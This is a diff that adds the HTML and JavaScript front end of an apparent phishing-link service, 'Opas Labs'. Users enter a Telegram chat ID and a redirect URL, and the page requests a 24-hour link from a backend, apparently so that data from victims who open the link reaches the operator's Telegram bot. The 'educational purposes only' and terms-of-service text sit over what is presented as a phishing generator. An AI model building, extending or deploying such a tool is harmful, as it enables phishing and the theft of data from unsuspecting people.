@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Opas Labs - Phishing Link Generator</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <style>
+    :root {
+      --primary: #6a11cb;
+      --secondary: #2575fc;
+      --accent: #00f2fe;
+      --dark: #0c1021;
+      --darker: #070a15;
+      --light: #f5f9ff;
+      --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: linear-gradient(135deg, var(--darker), var(--dark));
+      color: var(--light);
+      min-height: 100vh;
+      overflow-x: hidden;
+      line-height: 1.6;
+    }
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      opacity: 0.3;
+    }
+    .container {
+      max-width: 600px;
+      margin: 4rem auto;
+      padding: 2rem;
+      background: rgba(12, 16, 33, 0.8);
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      position: relative;
+      overflow: hidden;
+      z-index: 10;
+    }
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(0, 242, 254, 0.1) 0%, transparent 70%);
+      animation: rotate 15s linear infinite;
+      z-index: -1;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .logo h1 {
+      font-size: 2.5rem;
+      background: linear-gradient(90deg, var(--accent), var(--primary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: inline-block;
+      margin-bottom: 0.5rem;
+    }
+    .logo p {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 1.1rem;
+    }
+    .input-group {
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+      color: var(--accent);
+    }
+    .input-group i {
+      position: absolute;
+      left: 15px;
+      top: 70%;
+      transform: translateY(-50%);
+      color: var(--accent);
+      font-size: 1.2rem;
+    }
+    input[type="text"],
+    input[type="url"] {
+      width: 100%;
+      padding: 1rem 0.8rem 1rem 3rem;
+      background: rgba(7, 10, 21, 0.7);
+      color: var(--light);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      font-size: 16px;
+      transition: var(--transition);
+    }
+    input[type="text"]:focus,
+    input[type="url"]:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(0, 242, 254, 0.2);
+    }
+    button {
+      background: linear-gradient(90deg, var(--primary), var(--secondary));
+      color: white;
+      border: none;
+      padding: 1rem 1.5rem;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: bold;
+      transition: var(--transition);
+      box-shadow: 0 5px 15px rgba(37, 117, 252, 0.3);
+    }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(37, 117, 252, 0.4);
+    }
+    #result {
+      margin-top: 1.5rem;
+      padding: 1.5rem;
+      background: rgba(7, 10, 21, 0.7);
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      display: none;
+    }
+    #result p {
+      margin-bottom: 1rem;
+      color: var(--accent);
+      font-weight: 600;
+    }
+    #generatedLink {
+      display: block;
+      padding: 0.8rem;
+      background: rgba(12, 16, 33, 0.9);
+      border-radius: 6px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      margin-bottom: 1rem;
+      color: var(--light);
+      word-break: break-all;
+      text-decoration: none;
+      transition: var(--transition);
+    }
+    #generatedLink:hover {
+      background: rgba(12, 16, 33, 1);
+      border-color: rgba(0, 242, 254, 0.3);
+    }
+    #copyBtn {
+      background: linear-gradient(90deg, #1e88e5, #0d47a1);
+      margin-top: 0;
+    }
+    .note {
+      text-align: center;
+      margin-top: 1.5rem;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.5);
+    }
+    .get-id-link {
+      display: inline-block;
+      margin-bottom: 1rem;
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 600;
+      transition: var(--transition);
+    }
+    .get-id-link:hover {
+      text-decoration: underline;
+      color: #00c8ff;
+    }
+
+    /* Age Verification Modal */
+    .age-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(7, 10, 21, 0.3);
+      backdrop-filter: blur(10px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .age-modal-content {
+      background: rgba(12, 16, 33, 0.9);
+      padding: 2rem;
+      border-radius: 15px;
+      max-width: 500px;
+      width: 90%;
+      text-align: center;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+    }
+    
+    .age-modal h2 {
+      color: var(--accent);
+      margin-bottom: 1rem;
+      font-size: 1.8rem;
+    }
+    .age-modal p {
+      margin-bottom: 2rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+    .age-btn-group {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+    }
+    .age-btn {
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: var(--transition);
+      min-width: 120px;
+    }
+    .age-btn.underage {
+      background: linear-gradient(90deg, #f44336, #d32f2f);
+    }
+    .age-btn.adult {
+      background: linear-gradient(90deg, #4CAF50, #2E7D32);
+    }
+    .age-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    @media (max-width: 768px) {
+      .container {
+        margin: 2rem 1rem;
+        padding: 1.5rem;
+      }
+      .logo h1 {
+        font-size: 2rem;
+      }
+      .age-modal-content {
+        padding: 1.5rem;
+      }
+      .age-btn-group {
+        flex-direction: column;
+        gap: 0.8rem;
+      }
+      .age-btn {
+        width: 100%;
+      }
+    }
+    @media (max-width: 480px) {
+      .container {
+        margin: 1rem;
+        padding: 1rem;
+      }
+      .logo h1 {
+        font-size: 1.8rem;
+      }
+      input[type="text"],
+      input[type="url"] {
+        padding: 0.8rem 0.6rem 0.8rem 2.5rem;
+      }
+      .input-group i {
+        font-size: 1rem;
+        left: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Terms & Conditions Modal -->
+  <div id="termsModal" class="age-modal">
+    <div class="age-modal-content">
+      <h2><i class="fas fa-scroll"></i> Terms & Conditions & Privacy Policy</h2>
+      <p>
+        Please read and agree to our 
+        <a href="terms-and-conditions.html" target="_blank" style="color: var(--accent); text-decoration: underline;">Terms and Conditions</a> 
+        and 
+        <a href="privacy-policy.html" target="_blank" style="color: var(--accent); text-decoration: underline;">Privacy Policy</a> 
+        before starting.
+      </p>
+      <p>Welcome! Before proceeding, please review our Terms of Service and Privacy Policy. By clicking "Accept" below, you agree to our terms.</p>
+      <div class="age-btn-group">
+        <button class="age-btn underage" id="declineTermsBtn">
+          <i class="fas fa-times-circle"></i> Decline
+        </button>
+        <button class="age-btn adult" id="acceptTermsBtn">
+          <i class="fas fa-check-circle"></i> Accept
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Age Verification Modal -->
+  <div id="ageModal" class="age-modal">
+    <div class="age-modal-content">
+      <h2><i class="fas fa-exclamation-triangle"></i> Age Verification</h2>
+      <p>This tool is intended for adults only. By entering, you confirm that you are 18 years of age or older.</p>
+      <div class="age-btn-group">
+        <button class="age-btn underage" id="underageBtn">
+          <i class="fas fa-child"></i> I'm Under 18
+        </button>
+        <button class="age-btn adult" id="adultBtn">
+          <i class="fas fa-user-check"></i> I'm 18 or Older
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <canvas id="particles" class="particles"></canvas>
+  <div class="container">
+    <div class="logo">
+      <h1>Opas Labs</h1>
+      <p> Ethical Phishing Link Generation Tool</p>
+    </div>
+
+    <div class="input-group">
+      <label for="telegramId">
+        Telegram Chat ID
+        (<a href="https://t.me/opaslabs_bot?start=start" class="get-id-link" target="_blank" style="text-decoration: underline;">
+          Get your Chat ID
+        </a>)
+      </label>
+      <i class="fas fa-key"></i>
+      <input type="text" id="telegramId" placeholder="Paste the Chat ID that bot sends">
+    </div>
+
+    <div class="input-group">
+      <label for="redirectUrl">Redirect URL (Optional)</label>
+      <i class="fas fa-link"></i>
+      <input type="url" id="redirectUrl" placeholder="https://example.com">
+    </div>
+
+    <button id="generateBtn">
+      <i class="fas fa-bolt"></i> Generate Link
+    </button>
+
+    <div id="result">
+      <p>Generated Link (Expires in 24h):</p>
+      <a id="generatedLink" target="_blank"></a>
+      <button id="copyBtn">
+        <i class="fas fa-copy"></i> Copy Link
+      </button>
+    </div>
+
+    <div class="note">
+      <i class="fas fa-shield-alt"></i> This tool is for educational purposes only
+    </div>
+  </div>
+
+  <script>
+  // Particle Animation
+  const canvas = document.getElementById('particles');
+  const ctx = canvas.getContext('2d');
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  window.addEventListener('resize', resizeCanvas);
+  resizeCanvas();
+
+  let particlesArray = [];
+  const numberOfParticles = 150;
+
+  class Particle {
+    constructor() {
+      this.x = Math.random() * canvas.width;
+      this.y = Math.random() * canvas.height;
+      this.size = Math.random() * 2 + 0.5;
+      this.speedX = Math.random() * 1 - 0.5;
+      this.speedY = Math.random() * 1 - 0.5;
+    }
+    update() {
+      this.x += this.speedX;
+      this.y += this.speedY;
+      if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
+      if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
+    }
+    draw() {
+      ctx.fillStyle = 'rgba(0, 242, 254, 0.5)';
+      ctx.beginPath();
+      ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+      ctx.fill();
+    }
+  }
+
+  function initParticles() {
+    particlesArray = [];
+    for (let i = 0; i < numberOfParticles; i++) {
+      particlesArray.push(new Particle());
+    }
+  }
+
+  function connectParticles() {
+    for (let a = 0; a < particlesArray.length; a++) {
+      for (let b = a; b < particlesArray.length; b++) {
+        const dx = particlesArray[a].x - particlesArray[b].x;
+        const dy = particlesArray[a].y - particlesArray[b].y;
+        const distance = Math.sqrt(dx * dx + dy * dy);
+        if (distance < 100) {
+          ctx.strokeStyle = `rgba(0, 242, 254, ${0.1 - distance / 1000})`;
+          ctx.lineWidth = 0.5;
+          ctx.beginPath();
+          ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
+          ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
+          ctx.stroke();
+        }
+      }
+    }
+  }
+
+  function animateParticles() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    particlesArray.forEach(p => {
+      p.update();
+      p.draw();
+    });
+    connectParticles();
+    requestAnimationFrame(animateParticles);
+  }
+
+  initParticles();
+  animateParticles();
+
+  // Modal Elements
+  const termsModal = document.getElementById('termsModal');
+  const ageModal = document.getElementById('ageModal');
+  const declineTermsBtn = document.getElementById('declineTermsBtn');
+  const acceptTermsBtn = document.getElementById('acceptTermsBtn');
+  const underageBtn = document.getElementById('underageBtn');
+  const adultBtn = document.getElementById('adultBtn');
+  const generateBtn = document.getElementById('generateBtn');
+
+  // Link Generator Logic
+  async function generateLink() {
+    const telegramId = document.getElementById('telegramId').value.trim();
+    const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
+
+    try {
+      document.getElementById('generateBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
+
+      const response = await fetch('/api/generate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ telegramId, redirectUrl })
+      });
+
+      const data = await response.json();
+
+      document.getElementById('generatedLink').href = data.link;
+      document.getElementById('generatedLink').textContent = data.link;
+      document.getElementById('result').style.display = 'block';
+    } catch (error) {
+      alert('Error generating link');
+    } finally {
+      document.getElementById('generateBtn').innerHTML = '<i class="fas fa-bolt"></i> Generate Link';
+    }
+  }
+
+  // ✅ Generate Button Click: Validate Chat ID + URL before proceeding
+  generateBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+
+    const telegramId = document.getElementById('telegramId').value.trim();
+    const redirectUrl = document.getElementById('redirectUrl').value.trim();
+
+    // Check Telegram Chat ID (must be 9-10 digit number)
+    if (!/^\d{9,10}$/.test(telegramId)) {
+      alert('Invalid Telegram Chat ID. It must be a 9 or 10-digit number.');
+      return;
+    }
+
+    // If URL provided, validate it
+    if (redirectUrl !== '') {
+      const urlRegex = /^(https?:\/\/)[^\s/$.?#].[^\s]*$/i;
+      if (!urlRegex.test(redirectUrl)) {
+        alert('Invalid redirect URL. Must start with http:// or https://');
+        return;
+      }
+    }
+
+    // Proceed with modal checks
+    if (localStorage.getItem('ageVerified') !== 'true') {
+      ageModal.style.display = 'flex';
+      return;
+    }
+
+    if (localStorage.getItem('termsAccepted') !== 'true') {
+      startTermsTimer();
+      termsModal.style.display = 'flex';
+      return;
+    }
+
+    generateLink();
+  });
+
+  // Age Verification
+  underageBtn.addEventListener('click', function () {
+    window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
+  });
+
+  adultBtn.addEventListener('click', function () {
+    localStorage.setItem('ageVerified', 'true');
+    ageModal.style.display = 'none';
+    startTermsTimer();
+    termsModal.style.display = 'flex';
+  });
+
+  // Terms Timer Countdown
+  function startTermsTimer() {
+    const acceptBtn = document.getElementById('acceptTermsBtn');
+    acceptBtn.disabled = true;
+    acceptBtn.style.filter = 'grayscale(100%)';
+
+    let timeLeft = 5;
+    const originalText = '<i class="fas fa-check-circle"></i> Accept';
+    acceptBtn.innerHTML = `<i class="fas fa-clock"></i> Proceed (${timeLeft})`;
+
+    const countdown = setInterval(() => {
+      timeLeft--;
+      acceptBtn.innerHTML = `<i class="fas fa-clock"></i> Proceed (${timeLeft})`;
+
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        acceptBtn.disabled = false;
+        acceptBtn.innerHTML = originalText;
+        acceptBtn.style.filter = 'none';
+      }
+    }, 1000);
+  }
+
+  // Terms Modal Buttons
+  declineTermsBtn.addEventListener('click', function () {
+    window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
+  });
+
+  acceptTermsBtn.addEventListener('click', function () {
+    if (acceptTermsBtn.disabled) return;
+    localStorage.setItem('termsAccepted', 'true');
+    termsModal.style.display = 'none';
+    generateLink();
+  });
+
+  // Copy Button
+  document.getElementById('copyBtn').addEventListener('click', () => {
+    const link = document.getElementById('generatedLink').textContent;
+    navigator.clipboard.writeText(link).then(() => {
+      const btn = document.getElementById('copyBtn');
+      btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+      setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
+      }, 2000);
+    }).catch(err => {
+      console.error('Failed to copy: ', err);
+    });
+  });
+
+  document.addEventListener('DOMContentLoaded', function () {
+    // Nothing shown on page load
+  });
+</script>
+</body>
+</html>
